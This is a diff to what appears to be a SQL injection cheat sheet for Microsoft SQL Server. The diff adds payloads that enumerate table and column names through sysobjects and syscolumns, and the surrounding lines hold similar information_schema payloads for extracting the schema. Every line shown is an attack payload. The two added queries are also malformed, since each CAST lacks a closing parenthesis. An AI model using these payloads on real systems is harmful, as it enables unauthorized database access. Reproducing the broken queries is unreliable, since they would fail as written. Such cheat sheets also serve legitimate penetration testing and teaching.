@@ -3316,13 +3316,17 @@ db_name(X) # X = 0,1,2,... list db names
 
 ### current user
 user_name()
+
 ### table names
 (select+top+1+table_name+from+information_schema.tables) # first table
 (select+top+1+table_name+from+information_schema.tables+where+table_name+
     not+in+('first_table_name_here','second_table_name_here')) # subsequent tables
+(SELECT TOP 1 CAST(name as varchar(4096) FROM database_here..sysobjects WHERE xtype='U' AND name NOT IN ('known_table_name1_here','known_table_name2_here')); --
+
 ### column names
 (select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here') # first column
 (select+top+1+column_name+from+information_schema.columns+where+table_name='table_name_here'+and+column_name+not+in+('first_column_name_here')) # subsequent columns
+(SELECT TOP 1 CAST(database_here..syscolumns.name as varchar(4096) FROM database_here..syscolumns, database_here..sysobjects WHERE database_here..syscolumns.id=database_here..sysobjects.id AND database_here..sysobjects.name=table_name_here AND database_here..sysobjects.name NOT IN ('known_column_name1_here','known_column_name2_here')); --
 ```
 
 
